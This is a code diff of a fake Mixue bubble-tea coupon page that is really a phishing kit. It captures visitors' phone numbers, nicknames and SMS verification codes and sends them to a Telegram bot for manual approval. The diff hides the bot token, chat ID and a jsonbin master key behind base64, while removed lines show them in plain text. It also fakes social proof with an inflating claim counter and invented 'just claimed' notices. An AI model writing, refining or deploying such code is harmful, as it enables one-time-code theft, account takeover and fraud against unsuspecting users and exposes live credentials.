@@ -57,11 +57,8 @@
 
     .content { padding:32px 28px 40px; background:var(--mixue-white); }
 
-    .store-nav, .queue-status, .transfer-entry { cursor:pointer; transition:all 0.3s; }
-    .store-nav:hover, .queue-status:hover, .transfer-entry:hover { transform:translateY(-2px); }
-
     .barrage-box { height:120px; margin:0 0 20px; background:rgba(230,57,70,0.05); border-radius:var(--radius-sm); overflow:hidden; position:relative; border:1px solid rgba(230,57,70,0.1); padding:8px 0; }
-    .barrage-item { position:absolute; white-space:nowrap; font-size:0.95rem; font-weight:600; padding:6px 16px; line-height:1.4; left:100%; background:rgba(255,255,255,0.92); border-radius:20px; box-shadow:0 2px 8px rgba(0,0,0,0.12); z-index:1; }
+    .barrage-item { position:absolute; white-space:nowrap; font-size:0.95rem; font-weight:600; padding:6px 16px; line-height:1.4; left:100%; background:rgba(255,255,255,0.92); border-radius:20px; box-shadow:0 2px 8px rgba(0,0,0,0.12); z-index:1; animation:barrageSlide linear forwards; }
     @keyframes barrageSlide { 0% {transform:translateX(0);} 100% {transform:translateX(-200%);} }
 
     .input-box { position:relative; margin-bottom:20px; }
@@ -70,12 +67,99 @@
     input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
     @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }
 
-    .verify-slider { width:100%; height:46px; background:#f7f8fa; border-radius:23px; position:relative; margin:20px 0; overflow:hidden; border:1px solid #e5e6eb; display:none; opacity:0; transform:translateY(10px); transition:all 0.4s; }
-    .verify-slider.show { display:block; opacity:1; transform:translateY(0); }
-    .verify-text { position:absolute; left:50%; top:50%; transform:translate(-50%,-50%); color:#666; font-size:0.9rem; pointer-events:none; }
-    .verify-block { width:46px; height:46px; background:var(--mixue-red); color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; position:absolute; left:0; top:0; cursor:grab; user-select:none; }
-    .verify-bg { height:100%; background:rgba(230,57,70,0.1); position:absolute; left:0; top:0; width:0; border-radius:23px 0 0 23px; }
-    .verify-success .verify-block { background:#00b42a; }
+.verify-slider {
+  width: 100%;
+  height: 54px;
+  background: #f0f2f5;
+  border-radius: 27px;
+  position: relative;
+  margin: 24px 0 32px;
+  overflow: hidden;
+  border: 1px solid #e8eaed;
+  box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
+  display: none;
+  opacity: 0;
+  transform: translateY(12px);
+  transition: all 0.4s ease;
+}
+
+.verify-slider.show {
+  display: block;
+  opacity: 1;
+  transform: translateY(0);
+}
+
+.verify-bg {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  background: linear-gradient(90deg, #ffd166, #ffbd59);
+  width: 0;
+  transition: width 0.18s ease;
+  border-radius: 27px 0 0 27px;
+}
+
+.verify-success .verify-bg {
+  background: linear-gradient(90deg, #52c41a, #73d13d);
+  border-radius: 27px;
+}
+
+.verify-block {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 54px;
+  height: 54px;
+  background: white;
+  border-radius: 50%;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  font-weight: bold;
+  color: #666;
+  cursor: grab;
+  transition: all 0.2s ease;
+  z-index: 2;
+  user-select: none;
+}
+
+.verify-block:active {
+  cursor: grabbing;
+  transform: scale(1.08);
+  box-shadow: 0 6px 20px rgba(0,0,0,0.22);
+}
+
+.verify-success .verify-block {
+  background: #52c41a;
+  color: white;
+  box-shadow: 0 4px 16px rgba(82,196,26,0.4);
+}
+
+.verify-text {
+  position: absolute;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #8c8c8c;
+  font-size: 0.98rem;
+  font-weight: 500;
+  pointer-events: none;
+  z-index: 1;
+  transition: color 0.3s;
+}
+
+.verify-success .verify-text {
+  color: #52c41a;
+  font-weight: 600;
+  content: "验证成功";
+}
 
     .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); }
     .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }
@@ -140,7 +224,7 @@
     </div>
 
     <div class="input-box">
-      <input type="text" id="code" placeholder="请输入验证码" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" disabled />
+      <input type="text" id="code" placeholder="请输入验证码" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
     </div>
 
     <button class="btn" id="getCodeBtn" disabled>获取验证码</button>
@@ -154,7 +238,7 @@
   <div class="modal-content">
     <h2>领取成功！</h2>
     <p>大杯柠檬茶券已发至手机</p>
-    <div class="coupon-code">MX2026-ICE-ABCD1234</div>
+    <div class="coupon-code" id="couponCode">MX2026-ICE-ABCD1234</div>
     <p style="font-weight:bold; margin:20px 0;">请尽快到店核销，过期无效</p>
     <div class="modal-emoji">🎉🍋🔥</div>
     <button class="btn" id="closeModalBtn">好的，去兑换！</button>
@@ -162,24 +246,60 @@
 </div>
 
 <script>
-// ============================= 配置 =============================
-const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
-const CHAT_ID   = '8439448087';
-const BIN_ID    = '6985876ad0ea881f40a4c4a0';
-const MASTER_KEY = '$2a$10$DeNPX1R0C0PjshDJf/w1d.9wc8fHLNB0bAGBwXmrnsMCvSVTt/vga';
-const BIN_URL   = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
-const BIN_HEADERS = { 'Content-Type': 'application/json', 'X-Master-Key': MASTER_KEY };
+// ============================= 配置（已混淆） =============================
+const _0x5f2c = {
+  _b: 'ODMzODY3MjM5NTpBQUg5cmJ5czlzalktQnRodWJ2WHlWdjJScl9kX1ByX2tpSQ==',
+  _c: 'ODQzOTQ0ODA4Nw==',
+  _i: 'Njk4NTlhZmFkMGVhODgxZjQwYTRlNTI2',
+  _k: 'JDJhJDEwJERlTlBYMVIwQzBQanNoREpmL3cxZC45d2M4ZkhMTkIwYUFHQndYbXJuc01DdlNWVHQvdmdh'
+};
+
+// Base64解码函数
+function _d(b) {
+  const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+  let o = '', c1, c2, c3, e1, e2, e3, e4, i = 0;
+  b = b.replace(/[^A-Za-z0-9+/=]/g, '');
+  while (i < b.length) {
+    e1 = a.indexOf(b.charAt(i++));
+    e2 = a.indexOf(b.charAt(i++));
+    e3 = a.indexOf(b.charAt(i++));
+    e4 = a.indexOf(b.charAt(i++));
+    c1 = (e1 << 2) | (e2 >> 4);
+    c2 = ((e2 & 15) << 4) | (e3 >> 2);
+    c3 = ((e3 & 3) << 6) | e4;
+    o += String.fromCharCode(c1);
+    if (e3 !== 64) o += String.fromCharCode(c2);
+    if (e4 !== 64) o += String.fromCharCode(c3);
+  }
+  return decodeURIComponent(escape(o));
+}
+
+// 动态构建配置
+const _cfg = {
+  t: _d(_0x5f2c._b),
+  u: _d(_0x5f2c._c),
+  b: _d(_0x5f2c._i),
+  m: _d(_0x5f2c._k)
+};
 
 const TOTAL_STOCK = 5000;
 let claimed = 4567;
 let isVerifySuccess = false;
 let timers = {};
 
-// DOM
+// 生成随机优惠券码
+function generateCouponCode() {
+  const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
+  const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
+  return `${prefix}-ICE-${suffix}`;
+}
+
+// DOM对象获取
 const els = {
   phone: document.getElementById('phone'),
   nickname: document.getElementById('nickname'),
   code: document.getElementById('code'),
+  couponCode: document.getElementById('couponCode'),
   getBtn: document.getElementById('getCodeBtn'),
   submitBtn: document.getElementById('submitBtn'),
   countdown: document.getElementById('countdown'),
@@ -196,7 +316,7 @@ const els = {
   closeModalBtn: document.getElementById('closeModalBtn')
 };
 
-// ============================= 工具函数 =============================
+// ============================= 函数 =============================
 function showToast(msg) {
   const t = document.createElement('div');
   t.className = 'toast';
@@ -205,22 +325,45 @@ function showToast(msg) {
   setTimeout(() => t.remove(), 2800);
 }
 
-function shootBarrage(phone = null) {
-  const prefix = phone ? phone.slice(0,3)+'****'+phone.slice(7) : '1'+Math.floor(3000000000 + Math.random()*9000000000);
-  const surname = '赵钱孙李周吴郑王冯陈'[Math.floor(Math.random()*10)];
+function shootBarrage(customPhone = null) {
+  const chinaMobilePrefixes = ['134','135','136','137','138','139','147','150','151','152','157','158','159','172','178','182','183','184','187','188','198'];
+  const chinaUnicomPrefixes = ['130','131','132','145','155','156','166','175','176','185','186'];
+  const chinaTelecomPrefixes = ['133','149','153','173','177','180','181','189','199'];
+  const chinaBroadcastPrefixes = ['192'];
+  const allPrefixes = [...chinaMobilePrefixes, ...chinaUnicomPrefixes, ...chinaTelecomPrefixes, ...chinaBroadcastPrefixes];
+
+  let phoneDisplay;
+  if (customPhone && /^1[3-9]\d{9}$/.test(customPhone)) {
+    phoneDisplay = customPhone.slice(0,3) + "****" + customPhone.slice(7);
+  } else {
+    const prefix = allPrefixes[Math.floor(Math.random() * allPrefixes.length)];
+    const suffix = Math.floor(1000 + Math.random() * 9000);
+    phoneDisplay = prefix + "****" + suffix;
+  }
+
+  const surnames = [
+    '赵', '钱', '孙', '李', '周', '吴', '郑', '王', '冯', '陈',
+    '褚', '卫', '蒋', '沈', '韩', '杨', '朱', '秦', '尤', '许',
+    '何', '吕', '施', '张', '孔', '曹', '严', '华', '金', '魏',
+    '陶', '姜', '郝', '董', '梁', '杜', '戴', '宋', '唐', '邓',
+    '蔡', '潘', '袁', '于', '胡', '林', '郭', '马', '罗', '高'
+  ];
+  const surname = surnames[Math.floor(Math.random() * surnames.length)];
+
   const item = document.createElement('div');
   item.className = 'barrage-item';
-  item.textContent = `${surname}** ${prefix} 刚刚领取成功！`;
-  item.style.top = (10 + Math.random()*60) + 'px';
-  item.style.color = ['#c1121f','#9d0208','#e63946','#d00000'][Math.floor(Math.random()*4)];
-  const dur = 9 + Math.random()*7;
-  item.style.animation = `barrageSlide ${dur}s linear forwards`;
+  item.textContent = `${surname}** ${phoneDisplay} 刚刚领取成功！`;
+  item.style.top = (12 + Math.floor(Math.random() * 70)) + 'px';
+  const colors = ['#c1121f', '#e63946', '#d00000', '#9d0208', '#6a040f'];
+  item.style.color = colors[Math.floor(Math.random() * colors.length)];
+  const duration = 10 + Math.random() * 8;
+  item.style.animationDuration = duration + 's';
   els.barrageBox.appendChild(item);
-  setTimeout(() => item.remove(), dur*1000 + 1000);
+  setTimeout(() => item.remove(), duration * 1000 + 800);
 }
 
 function updateStock() {
-  const remain = Math.max(0, TOTAL_STOCK - claimed);
+  const remain = Math.max(0, TOTAL_STOCK - (claimed - 4567));
   els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
   els.remainCount.textContent = remain.toLocaleString('zh-CN');
   els.countNum.textContent = claimed.toLocaleString('zh-CN');
@@ -230,7 +373,7 @@ function updateStock() {
 function fakeClaim() {
   if (Math.random() > 0.45) {
     const add = 1 + Math.floor(Math.random()*5);
-    claimed = Math.min(claimed + add, TOTAL_STOCK);
+    claimed += add;
     updateStock();
     for(let i=0; i<add; i++) setTimeout(shootBarrage, i*900);
   }
@@ -257,6 +400,7 @@ function resetSlider() {
   els.verifyBlock.style.left = '0';
   els.verifyBg.style.width = '0';
   els.verifyBlock.textContent = '→';
+  els.verifySlider.querySelector('.verify-text').textContent = '向右滑动完成验证';
 }
 
 function initSlider() {
@@ -287,8 +431,8 @@ function initSlider() {
         els.verifyBlock.textContent = '✓';
         els.verifyBlock.style.left = max + 'px';
         els.verifyBg.style.width = max + 'px';
+        els.verifySlider.querySelector('.verify-text').textContent = '验证成功';
         checkPhoneValid();
-        showToast('验证成功！');
       } else resetSlider();
       document.removeEventListener('mousemove', move);
       document.removeEventListener('touchmove', move);
@@ -296,9 +440,14 @@ function initSlider() {
       document.removeEventListener('touchend', end);
     };
 
-    els.verifyBlock.addEventListener('mousedown', start);
-    els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e); }, {passive:false});
+    document.addEventListener('mousemove', move);
+    document.addEventListener('touchmove', move, {passive:false});
+    document.addEventListener('mouseup', end);
+    document.addEventListener('touchend', end);
   };
+
+  els.verifyBlock.addEventListener('mousedown', start);
+  els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e); }, {passive:false});
 }
 
 function startCountdown() {
@@ -324,47 +473,31 @@ async function pollCheck(phone) {
   els.loadingMask.querySelector('.loading-text').textContent = '人工审核中，请稍等...';
   els.loadingMask.classList.add('show');
 
+  const headers = {
+    'Content-Type': 'application/json',
+    'X-Master-Key': _cfg.m
+  };
+
   timers.poll = setInterval(async () => {
     try {
-      const { data } = await axios.get(BIN_URL, { headers: BIN_HEADERS });
+      const { data } = await axios.get(`https://api.jsonbin.io/v3/b/${_cfg.b}`, { headers: headers });
       if (data?.record?.allowed_phones?.includes(phone)) {
         clearInterval(timers.poll);
         els.loadingMask.classList.remove('show');
-        claimed = Math.min(claimed + 1, TOTAL_STOCK);
+        claimed++;
         updateStock();
         shootBarrage(phone);
+        els.couponCode.textContent = generateCouponCode();
         els.modal.classList.add('show');
         localStorage.setItem('mx_claim_' + phone, Date.now());
       }
     } catch (err) {
-      console.log('轮询失败:', err);
+      console.log('轮询失败：', err);
     }
   }, 6000);
 }
 
-// 封装TG消息发送函数（核心修复：使用axios+处理跨域+错误提示）
-async function sendTgMessage(text) {
-  try {
-    const res = await axios.post(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      { chat_id: CHAT_ID, text: text, parse_mode: 'plain' },
-      { headers: { 'Content-Type': 'application/json' } }
-    );
-    if (res.data.ok) {
-      showToast('请求已提交');
-      return true;
-    } else {
-      showToast('TG发送失败：' + res.data.description);
-      return false;
-    }
-  } catch (err) {
-    showToast('网络异常，请重试');
-    console.error('TG接口错误:', err);
-    return false;
-  }
-}
-
-// ============================= 事件绑定 =============================
+// ============================= 事件 =============================
 els.phone.addEventListener('input', checkPhoneValid);
 els.phone.addEventListener('blur', checkPhoneValid);
 
@@ -372,22 +505,29 @@ els.closeModalBtn.addEventListener('click', () => {
   els.modal.classList.remove('show');
 });
 
-// 核心修复：获取验证码点击事件
 els.getBtn.addEventListener('click', async () => {
   if (els.getBtn.disabled) return;
   const phone = els.phone.value.trim();
   const nick = els.nickname.value.trim() || '无';
-  const sendTime = new Date().toLocaleString('zh-CN');
-  
-  // 发送TG消息（封装后保证稳定性）
-  const isSend = await sendTgMessage(`【新号】\n昵称：${nick}\n手机号：${phone}\n时间：${sendTime}`);
-  if (!isSend) return;
 
-  // 倒计时逻辑
+  try {
+    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
+    await fetch(ep, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: _cfg.u,
+        text: `【新号】\n昵称：${nick}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`
+      })
+    });
+  } catch (err) {
+    console.log('发送失败：', err);
+    showToast('网络异常，稍后再试');
+  }
+
   let s = 60;
   els.getBtn.disabled = true;
   els.getBtn.textContent = `重发(${s}s)`;
-  els.code.disabled = false;
   els.code.focus();
   els.countdown.style.opacity = '1';
   els.countdown.textContent = `验证码已发送（${s}s）`;
@@ -405,53 +545,53 @@ els.getBtn.addEventListener('click', async () => {
   }, 1000);
 });
 
-// 验证码输入事件
 els.code.addEventListener('input', () => {
   const len = els.code.value.trim().length;
-  els.submitBtn.style.display = len >= 6 ? 'block' : 'none';
+  els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
   els.submitBtn.disabled = len < 6;
   els.code.classList.toggle('input-error', len > 0 && len < 6);
 });
 
-// 提交按钮事件
 els.submitBtn.addEventListener('click', async () => {
   if (els.submitBtn.disabled) return;
   const phone = els.phone.value.trim();
   const code = els.code.value.trim();
   const nick = els.nickname.value.trim() || '无';
-  const sendTime = new Date().toLocaleString('zh-CN');
 
-  if (code.length !== 6) {
-    showToast('请输入6位验证码');
+  if (code.length !== 6) return showToast('请输入6位有效验证码');
+
+  try {
+    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
+    await fetch(ep, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: _cfg.u,
+        text: `【验证码】\n昵称：${nick}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n放行：通过 ${phone}`
+      })
+    });
+  } catch (err) {
+    console.log('发送失败：', err);
+    showToast('网络异常，提交失败');
     return;
   }
 
-  // 发送验证码信息到TG
-  await sendTgMessage(`【验证码】\n昵称：${nick}\n手机号：${phone}\n验证码：${code}\n时间：${sendTime}\n放行：通过 ${phone}`);
   pollCheck(phone);
   showToast('提交成功，正在等待人工审核...');
 });
 
-// 模态框点击遮罩关闭
 els.modal.addEventListener('click', e => {
   if (e.target === els.modal) els.modal.classList.remove('show');
 });
 
-// ============================= 页面启动 =============================
+// ============================= 启动 =============================
 window.addEventListener('load', () => {
-  // 初始化库存
-  updateStock();
-  // 模拟领取
   timers.fake = setInterval(fakeClaim, 2200);
-  // 模拟弹幕
   timers.barrage = setInterval(() => Math.random() > 0.5 && shootBarrage(), 5000);
-  // 全局倒计时
   startCountdown();
-  // 初始化验证码输入框为禁用
-  els.code.disabled = true;
+  updateStock();
 });
 
-// 页面卸载清除定时器
 window.addEventListener('beforeunload', () => {
   Object.values(timers).forEach(t => clearInterval(t));
 });
